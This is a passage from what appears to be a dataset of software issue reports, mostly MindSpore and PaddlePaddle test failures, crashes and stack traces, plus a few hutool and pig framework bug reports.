in __call__ File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in &lt;lambda&gt; File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/runner.py"", line 237 in from_call File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in call_runtest_hook File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/runner.py"", line 185 in call_and_report File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/runner.py"", line 99 in runtestprotocol File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/runner.py"", line 84 in pytest_runtest_protocol File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/main.py"", line 271 in pytest_runtestloop File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/main.py"", line 247 in _main File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/main.py"", line 197 in wrap_session File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/main.py"", line 240 in pytest_cmdline_main File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/config/__init__.py"", line 93 in main File ""/root/miniconda3/envs/copy_ok/bin/pytest"", line 8 in &lt;module&gt; Floating point exception (core dumped) test_raggedrange.py Fatal Python error: Floating point exception Thread 0x00007fe761c1d740 (most recent call first): File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/mindspore/common/api.py"", line 1417 in _exec_pip File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/mindspore/common/api.py"", line 98 in wrapper File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/mindspore/common/api.py"", line 1435 in run File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/mindspore/common/api.py"", line 1398 in __call__ File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 948 in compile_and_run File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 627 in __call__ File ""/home/chenpanmiao/1221_mr_gpu/MindSporeTest/share/utils.py"", line 199 in __call__ File ""/home/chenpanmiao/1221_mr_gpu/MindSporeTest/share/ops/primitive/raggedrange_ops.py"", line 45 in forward_mindspore_impl File ""/home/chenpanmiao/1221_mr_gpu/MindSporeTest/share/ops/primitive/raggedrange_ops.py"", line 75 in forward_cmp File ""/home/chenpanmiao/1221_mr_gpu/MindSporeTest/operations/test_raggedrange.py"", line 37 in test_p_raggedrange_kong_tensor File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/python.py"", line 167 in pytest_pyfunc_call File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/python.py"", line 1445 in runtest File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/runner.py"", line 134 in pytest_runtest_call File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in &lt;lambda&gt; File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/runner.py"", line 237 in from_call File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in call_runtest_hook File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/runner.py"", line 185 in call_and_report File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/runner.py"", line 99 in runtestprotocol File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/runner.py"", line 84 in pytest_runtest_protocol File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/main.py"", line 271 in pytest_runtestloop File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/main.py"", line 247 in _main File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/main.py"", line 197 in wrap_session File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/main.py"", line 240 in pytest_cmdline_main File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/config/__init__.py"", line 93 in main File ""/root/miniconda3/envs/copy_ok/bin/pytest"", line 8 in &lt;module&gt; Floating point exception (core dumped) def test_p_raggedrange_kong_tensor(): starts = Tensor(()) limits = Tensor(()) deltas = Tensor(()) fact = RaggedRangeMock(attributes={""Tsplits"": mstype.int32}, inputs=[starts, limits, deltas]) fact.forward_cmp()"
[CT][MS][OP]IndexAdd  calculation result is incorrect at ascend,": Ascend /device ascend : -- MindSpore version :master -- Python version :3.7.5 -- OS platform and distribution : -- GCC/Compiler version : test_indexadd_inputx_6_indices_6_inputy_7_axis_0 test_indexadd_inputx_6_indices_6_inputy_7_axis_minus_1 test_indexadd_inputx_2x8x16x3_indices_4_inputy_4x8x16x3_axis_0 test_indexadd_inputx_2x8x16x3x2_indices_3_inputy_2x8x3x3x2_axis_2 test_indexadd_inputx_2x8x16x3x2x4_indices_6_inputy_2x8x16x3x6x4_axis_minus_2 test_indexadd_inputx_2x8x16x3x2x4x5_indices_5_inputy_2x8x16x5x2x4x5_axis_minus_3_fp32 test_indexadd_inputx_2x8x16x3x2x4x5_indices_5_inputy_2x8x16x5x2x4x5_axis_minus_3_int32 test_indexadd_inputx_2x8x16x3x2x4x5_indices_5_inputy_2x8x16x5x2x4x5_axis_minus_3_fp16 test case with pytest test_indexadd.py 以上用例计算结果不正确，与标杆对比失败 计算结果正确， 与标杆对比通过   <code>: def test_indexadd_inputx_6_indices_6_inputy_7_axis_0(): input_list = [] input_list.append( Parameter(Tensor(np.random.randn(6, ).astype(np.float32), dtype=mstype.float32))) input_list.append(Tensor(np.random.randint(0, 6, size=7).astype(np.int32), dtype=mstype.int32)) input_list.append(Tensor(np.random.randn(7, ).astype(np.float32), dtype=mstype.float32)) attributes = {'axis': 0} fact = IndexAddMock(attributes=attributes, inputs=input_list) &gt; fact.forward_cmp() E AssertionError: E data_expected_std:[ 1.4607487 -0.9566469 -0.11712173 1.2003446 ] E data_me_error:[ 1.9056616 0.8248175 0.17023647 -0.5727187 ] E loss:[0.4449129 1.7814643 0.2873582 1.7730632]"
【异常国际化】服务器上登录接口，用户名或密码错误时，返回的错误信息不是messages_zh_CN.properties文件中的中文,pigx版本: 3.3 是否二开: 否 是否修改包名: 否 图中，左边是本地测试密码错误，右边是服务器上密码错误时返回的样子，这个是那边需要配置吗   <code>: 服务器上登录接口，用户名或密码错误时，返回的错误信息不是messages_zh_CN.properties 文件中的中文Unicode，而是默认messages.properties文件中的英文，但是本地测试用户 名密码错误时，可以返回中文错误提示信息，看图
搜索数据，插入数据，更新数据，日期字段，如果设置成year，都不生效。,"例如学生一个字段，级别：设置格式为 前端代码里，查询那块，设置日期控件显示的格式为： ，随便选择个年份，返回结果是全部结果，看控制台提示的查询log，Parameters 并没有传过去年份。 添加那里设置日期控件格式时，代码如下： 最终虽然添加成功了，但级别那里显示的是。 更新的也同样，更新了年份，不能生效。大佬们看看哪里出了问题～   <code>: @JsonFormat(pattern = ""yyyy"") input type=""text"" class=""time-input"" data-type=""year"" data-format=""yyyy"" $(""input[name='studentYear']"").datetimepicker({ format: 'yyyy', startView: 4, minView: 'decade', viewSelect: 'decade', autoclose: true }); -"
cn.hutool.core.io.FileUtilTest#getMimeTypeTest 报错,"JDK版本： openjdk_8_333 hutool版本： 5.X.X 堆栈信息 <ol start=""3"">   <code>: mvn test ------------------------------------------------------------------------------- Test set: cn.hutool.core.io.FileUtilTest ------------------------------------------------------------------------------- Tests run: 42, Failures: 1, Errors: 0, Skipped: 17, Time elapsed: 0.016 sec &lt;&lt;&lt; FAILURE! getMimeTypeTest(cn.hutool.core.io.FileUtilTest) Time elapsed: 0.016 sec &lt;&lt;&lt; FAILURE! java.lang.AssertionError: expected:&lt;application/msword&gt; but was:&lt;null&gt; at org.junit.Assert.fail(Assert.java:89) at org.junit.Assert.failNotEquals(Assert.java:835) at org.junit.Assert.assertEquals(Assert.java:120) at org.junit.Assert.assertEquals(Assert.java:146) at cn.hutool.core.io.FileUtilTest.getMimeTypeTest(FileUtilTest.java:436) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:59) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:56) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.junit.runners.ParentRunner$3.evaluate(ParentRunner.java:306) at org.junit.runners.BlockJUnit4ClassRunner$1.evaluate(BlockJUnit4ClassRunner.java:100) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:366) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:103) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:63) at org.junit.runners.ParentRunner$4.run(ParentRunner.java:331) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:79) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:329) at org.junit.runners.ParentRunner.access$100(ParentRunner.java:66) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:293) at org.junit.runners.ParentRunner$3.evaluate(ParentRunner.java:306) at org.junit.runners.ParentRunner.run(ParentRunner.java:413) at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:252) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:141) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:112) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.maven.surefire.util.ReflectionUtils.invokeMethodWithArray(ReflectionUtils.java:189) at org.apache.maven.surefire.booter.ProviderFactory$ProviderProxy.invoke(ProviderFactory.java:165) at org.apache.maven.surefire.booter.ProviderFactory.invokeProvider(ProviderFactory.java:85) at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:115) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:75)"
grpc socket closed,"paddle版本：0.15 模型：se-resnext 运行环境：多机单卡 cloudjob： http://paddlecloud.baidu-int.com:8088/paddle/jobRunInfo?jobId=job-e6c5b84eb93bf1e0&amp;flag=jobs&amp;groupName=k8s_gpu_demo&amp;groupId=c0a1f165-6279-5320-b9e7-e0218c7a87f5&amp;currentPage=1&amp;currentKey=1 一个trainer报错如下:   <code>: Pass 0,testbatch 780,loss 4.08835697174, acc1 0.140625,acc5 0.34375,time 0.50 sec End pass 0, train_loss 5.25758123398, train_acc1 0.0796363949776, train_acc5 0.206397086382, test_loss 4.55846201157, test_acc1 0.13004, test_acc5 0.32652 F0828 18:55:50.632199 3341 grpc_client.cc:295] name:[], ep:[] meets grpc error:Socket closed *** Check failure stack trace: *** @ 0x7fa5d3ef0fed google::LogMessage::Fail() @ 0x7fa5d3ef4a9c google::LogMessage::SendToLog() @ 0x7fa5d3ef0b13 google::LogMessage::Flush() @ 0x7fa5d3ef5fae google::LogMessageFatal::~LogMessageFatal() @ 0x7fa5d4d8ce38 paddle::operators::distributed::GRPCClient::Proceed() @ 0x7fa5e8c0e470 (unknown) @ 0x7fa63b14a851 start_thread @ 0x7fa63a80d90d clone @ (nil) (unknown) /root/paddlejob/run.sh: line 239: 3248 Aborted (core dumped) python train.py *********************error messages********************"
[ST][MS/modelzoo][NET][crnn_seq][Ascend]fps is smaller than standard ,"性能劣化 fps :955 &lt; 1000 问题commitid：f51ce15a(202206) ok_commit_id:ac72a96d (20220614) / 硬件环境: /device Ascend/ : -- MindSpore version :master commit_id:ad11cdb0 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_crnn_seq_check_fps_8p get code from models sh run_train.sh 训练成功,性能达到1000fps 备注 提给panfengfeng   <code>: INFO test_ms_crnn_seq_fsns_train_check_loss_8p_0002m9L8WK4z:base.py:180 per step time is 268.062750 INFO test_ms_crnn_seq_fsns_train_check_loss_8p_0002m9L8WK4z:base.py:183 FPS: 955"
最新版本gateway项目无法启动,"pig版本: 最新的master版本/最新tag 2.3.1 操作系统: win7 是否修改包名: 未修改 启动eureka-&gt;启动config-&gt;启动gateway tomcat的相关jar删除了重新下载还是这个错误 重新换库了也没有用,还是这个错误   <code>: Caused by: org.springframework.context.ApplicationContextException: Unable to start ServletWebServerApplicationContext due to missing ServletWebServerFactory bean. at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.getWebServerFactory(ServletWebServerApplicationContext.java:202) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.createWebServer(ServletWebServerApplicationContext.java:178) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.onRefresh(ServletWebServerApplicationContext.java:152) ... 8 common frames omitted"
完善操作提示,"这里在删除代理时应该提示更多一些，防止新手误操作删除代理后还不知道   <code>: 提示：发现你电脑设置了Git代理，如果Git报错，请运行下面两句话： git config --global --unset https.proxy git config --global --unset http.proxy\033[0m "" fi }"
"[CT][MS][parallel]shared_weight_mixed_precision_auto_fixed_losssscale, Occasional case failure",": /device gpu : -- MindSpore version :master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : dc7296ba1e test_auto_parallel_shared_weight_mixed_precision_auto_fixed_losssscale test_dataparallel_incremental_train_opt1_ftrl_opt2_momentum_lr1_group_lr2_tuple_scale1_dynamic_scale2_static test_dataparallel_incremental_train_opt1_ftrl_opt2_momentum_lr1_group_lr2_tuple_scale1_static_scale2_dynamic test_semi_auto_parallel_shared_weight_2x2 cd /home/wys/code2/MindSporeTest/parallel/optimizer sh test_parallel_shard_weight.sh shared_weight_mixed_precision_auto_fixed_losssscale, Occasional case failure case pass   <code>: """""" TEST_SUMMARY: 自动混合精度+参数切满+参数共享: dynamic programming amp_level=auto, loss_scale_manager=FixedLossScaleManager """""" def test_auto_parallel_shared_weight_mixed_precision_auto_fixed_losssscale(): standalone_net = MulAddMul(size=(32, 32)) parallel_net = MulAddMul(size=(32, 32)) fact = OptimizerMixedPrecisionFactory( level=""auto"", mix=2, parallel_net=parallel_net, standalone_net=standalone_net ) standalone_dataset = FakeData( size=64, batch_size=32, image_size=(32,), num_classes=32 ) fact.mindspore_standalone_impl(dataset=standalone_dataset, epoch=2) parallel_dataset = FakeData( size=64, batch_size=4, image_size=(32,), use_parallel=True, num_classes=32 ) fact.mindspore_auto_parallel_impl(dataset=parallel_dataset, epoch=2, device_num=8) inputs_np = np.random.randn(32, 32).astype(np.float32) fact.checkpoint_cmp(inputs_np=inputs_np)"
Paddle Fluid pserver do not exit when trainer finished.,"Hi, I am using paddle fluid rpc mode training. When 2 trainers finished, the pserver does not exit like following picture: Then:   <code>: def dist_transpile(self, train_prog, startup_prog, dist_config): """""" Distributed compile function, usd for distributed trianing. """""" port = dist_config[""PADDLE_PSERVER_PORT""] pserver_ips = dist_config[""PADDLE_PSERVER_IPS""] eplist = [] for ip in pserver_ips.split("",""): eplist.append(':'.join([ip, port])) pserver_endpoints = "","".join(eplist) trainers = int(dist_config[""PADDLE_TRAINERS""]) current_endpoint = dist_config[""PADDLE_CURRENT_IP""] + "":"" + port training_role = dist_config[""PADDLE_TRAINING_ROLE""] config = fluid.DistributeTranspilerConfig() # config.slice_var_up = self.workflow_conf[""no_split_var""] t = fluid.DistributeTranspiler(config=config) t.transpile( self.trainer_id, program=train_prog, pservers=pserver_endpoints, trainers=trainers, sync_mode=bool(dist_config[""SYNC_MODE""]), startup_program=startup_prog) if training_role == ""PSERVER"": pserver_program = t.get_pserver_program(current_endpoint) pserver_startup_program = t.get_startup_program( current_endpoint, pserver_program, startup_program=startup_prog) return pserver_program, pserver_startup_program elif training_role == ""TRAINER"": train_program = t.get_trainer_program() return train_program, startup_prog else: raise ValueError( 'PADDLE_TRAINING_ROLE environment variable must be either TRAINER or PSERVER' )"
[CT][MS][OCCM][sparsesegmentmeanwithnumsegments]ascend报错提示the operator can not supported on Ascend platform,"算子在ascend上不支持 报错 def test_p_sparsesegmentmeanwithnumsegments_dim2_fp32_int32(): x = Tensor(np.random.randn(2, 4).astype(np.float32)) indices = Tensor(np.array([0, 1]).astype(np.int32)) segment_ids = Tensor(np.array([0, 1]).astype(np.int32)) num_segments = Tensor(np.array(4).astype(np.int32)) fact = SparseSegmentMeanWithNumSegmentsMock(inputs=[x, indices, segment_ids, num_segments]) test_sparsesegmentmeanwithnumsegments.py:52: ../share/ops/primitive/sparsesegmentmeanwithnumsegments_ops.py:88: in forward_cmp out_mindspore = self.forward_mindspore_impl() ../share/ops/primitive/sparsesegmentmeanwithnumsegments_ops.py:47: in forward_mindspore_impl out = net(self.x, self.indices, self.segment_ids, self.num_segments) ../share/utils.py:199: in call out = super().call(*args, **kwargs) /root/archiconda3/envs/nisong3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:627: in call out = self.compile_and_run(*args) /root/archiconda3/envs/nisong3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:943: in compile_and_run self.compile(*inputs) /root/archiconda3/envs/nisong3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:917: in compile jit_config_dict=self._jit_config_dict) self = &lt;mindspore.common.api._CellGraphExecutor object at 0xffff77f24110&gt;, obj = WrapOp&lt;&gt; phase = 'train.1669460194950052608.281472102860656.0', do_convert = True, jit_config_dict = {} args = (Tensor(shape=[2, 4], dtype=Float32, value= [[-3.24129492e-01, -6.46240056e-01, 5.05356431e-01, 2.71702439e-01], [ ...], dtype=Int32, value= [0, 1]), Tensor(shape=[2], dtype=Int32, value= [0, 1]), Tensor(shape=[], dtype=Int32, valu e= 4)) E RuntimeError: Can not find any available kernel info for: SparseSegmentMeanWithNumSegments. Maybe the operator can not supported on Ascend platform. E E ---------------------------------------------------- E - The Function Call Stack: (For framework developers) E ---------------------------------------------------- E In file /home/nisong/MindSporeTest/share/ops/primitive/sparsesegmentmeanwithnumsegments_ops.py:21/ retur n self.SparseSegmentMeanWithNumSegments(x, indices, segment_ids, num_segments)/ E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_graph_optimization.cc:398 SetOperatorInfo /root/archiconda3/envs/nisong3.7/lib/python3.7/site-packages/mindspore/common/api.py:1320: RuntimeError / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_p_sparsesegmentmeanwithnumsegments_dim2_fp32_int32 test_p_sparsesegmentmeanwithnumsegments_input_x_dim1 test_p_sparsesegmentmeanwithnumsegments_dim1_fp16_int32 test_p_sparsesegmentmeanwithnumsegments_dim3_fp16_int32 test_p_sparsesegmentmeanwithnumsegments_dim4_fp32_int64 test_p_sparsesegmentmeanwithnumsegments_dim5_fp32_int64 test_p_sparsesegmentmeanwithnumsegments_dim6_fp64_int64 test_p_sparsesegmentmeanwithnumsegments_dim7_fp64_int64 test_dynamic_shape_sparsesegmentmeanwithnumsegments_4x5_fp32_int64 test_dynamic_shape_sparsesegmentmeanwithnumsegments_4x5x6_fp16_int64 test_dynamic_shape_sparsesegmentmeanwithnumsegments_4x5x6x7_fp32_int32   <code>: fact.forward_cmp() def compile(self, obj, *args, phase='predict', do_convert=True, jit_config_dict=None): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. jit_config_dict (dict): Jit config for compile. Default: None. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args self.enable_tuple_broaden = False if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(obj, args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) enable_ge = context.get_context(""enable_ge"") self._graph_executor.set_weights_values(obj.parameters_dict()) if jit_config_dict: self._graph_executor.set_jit_config(jit_config_dict) result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode())"
mpi跑出错,"我在本地跑没有问题，MPI上跑出现了如下错误   <code>: Mon Jan 15 15:25:36 2018[1,7]&lt;stderr&gt;:*** Check failure stack trace: *** Mon Jan 15 15:25:36 2018[1,7]&lt;stderr&gt;: @ 0x7ffdc3753dfd google::LogMessage::Fail() Mon Jan 15 15:25:36 2018[1,7]&lt;stderr&gt;:F0115 15:25:36.055384 26709 SocketChannel.cpp:54] Check failed: len &gt;= 0 peer=10.86.105.39 Mon Jan 15 15:25:36 2018[1,7]&lt;stderr&gt;:*** SIGSEGV (@0x8) received by PID 25735 (TID 0x7ffc2ebcd700) from PID 8; stack trace: *** Mon Jan 15 15:25:36 2018[1,12]&lt;stderr&gt;:./train.sh: line 239: 12152 Segmentation fault python27-gcc482/bin/python conf/trainer_config.conf Mon Jan 15 15:25:36 2018[1,12]&lt;stderr&gt;:+ '[' 139 -ne 0 ']' Mon Jan 15 15:25:36 2018[1,12]&lt;stderr&gt;:+ kill_pserver2_exit Mon Jan 15 15:25:36 2018[1,12]&lt;stderr&gt;:+ ps aux Mon Jan 15 15:25:36 2018[1,12]&lt;stderr&gt;:+ grep paddle_pserver2 Mon Jan 15 15:25:36 2018[1,12]&lt;stderr&gt;:+ grep paddle_cluster_job Mon Jan 15 15:25:36 2018[1,12]&lt;stderr&gt;:+ grep -v grep Mon Jan 15 15:25:36 2018[1,38]&lt;stderr&gt;:PC: @ 0x0 (unknown) Mon Jan 15 15:25:36 2018[1,38]&lt;stderr&gt;:*** SIGSEGV (@0x8) received by PID 51393 (TID 0x7fcd795de700) from PID 8; stack trace: *** Mon Jan 15 15:25:36 2018[1,38]&lt;stderr&gt;: @ 0x7fcf61b2a160 (unknown) Mon Jan 15 15:25:36 2018[1,38]&lt;stderr&gt;: @ 0x7fcf00ac3162 paddle::ProtoClient::recv() Mon Jan 15 15:25:36 2018[1,38]&lt;stderr&gt;: @ 0x7fcf00c5f8ac google::LogMessage::SendToLog() Mon Jan 15 15:25:36 2018[1,38]&lt;stderr&gt;: @ 0x7fcf00c5b923 google::LogMessage::Flush() Mon Jan 15 15:25:36 2018[1,38]&lt;stderr&gt;: @ 0x7fcf00c60dbe google::LogMessageFatal::~LogMessageFatal() Mon Jan 15 15:25:36 2018[1,38]&lt;stderr&gt;: @ 0x7fcf00ac1e34 paddle::SocketChannel::read() Mon Jan 15 15:25:36 2018[1,38]&lt;stderr&gt;: @ 0x7fcf027e66e4 paddle::ParameterClient2::sendParallel() Mon Jan 15 15:25:36 2018[1,38]&lt;stderr&gt;: @ 0x7fcf00bcb57c _ZNSt6thread5_ImplISt12_Bind_simpleIFZN6paddle14SyncThreadPool5startEvEUliE_mEEE6_M_runEv Mon Jan 15 15:25:36 2018[1,38]&lt;stderr&gt;: @ 0x7fcf50ea38a0 execute_native_thread_routine Mon Jan 15 15:25:36 2018[1,38]&lt;stderr&gt;: @ 0x7fcf00ac2320 paddle::SocketChannel::readMessage() Mon Jan 15 15:25:36 2018[1,18]&lt;stderr&gt;:*** Check failure stack trace: *** Mon Jan 15 15:25:36 2018[1,18]&lt;stderr&gt;: @ 0x7fa83467cdfd google::LogMessage::Fail() Mon Jan 15 15:25:36 2018[1,38]&lt;stderr&gt;: @ 0x7fcf00ac3156 paddle::ProtoClient::recv() Mon Jan 15 15:25:36 2018[1,38]&lt;stderr&gt;: @ 0x7fcf027e66e4 paddle::ParameterClient2::sendParallel() Mon Jan 15 15:25:36 2018[1,18]&lt;stderr&gt;: @ 0x7fa8346808ac google::LogMessage::SendToLog() Mon Jan 15 15:25:36 2018[1,18]&lt;stderr&gt;: @ 0x7fa83467c923 google::LogMessage::Flush() Mon Jan 15 15:25:36 2018[1,18]&lt;stderr&gt;:*** SIGSEGV (@0x8) received by PID 59888 (TID 0x7fa6b67ee700) from PID 8; stack trace: *** Mon Jan 15 15:25:36 2018[1,38]&lt;stderr&gt;: @ 0x7fcf61b221c3 start_thread Mon Jan 15 15:25:36 2018[1,18]&lt;stderr&gt;: @ 0x7fa89554b160 (unknown) Mon Jan 15 15:25:36 2018[1,38]&lt;stderr&gt;: @ 0x7fcf6114a12d __clone Mon Jan 15 15:25:36 2018[1,18]&lt;stderr&gt;: @ 0x7fa8344e4162 paddle::ProtoClient::recv() Mon Jan 15 15:25:36 2018[1,38]&lt;stderr&gt;: @ 0x7fcf00bcb57c _ZNSt6thread5_ImplISt12_Bind_simpleIFZN6paddle14SyncThreadPool5startEvEUliE_mEEE6_M_runEv Mon Jan 15 15:25:36 2018[1,18]&lt;stderr&gt;: @ 0x7fa834681dbe google::LogMessageFatal::~LogMessageFatal() Mon Jan 15 15:25:36 2018[1,29]&lt;stderr&gt;:*** Aborted at 1516001136 (unix time) try ""date -d @1516001136"" if you are using GNU date *** Mon Jan 15 15:25:36 2018[1,38]&lt;stderr&gt;: @ 0x7fcf50ea38a0 execute_native_thread_routine Mon Jan 15 15:25:36 2018[1,18]&lt;stderr&gt;: @ 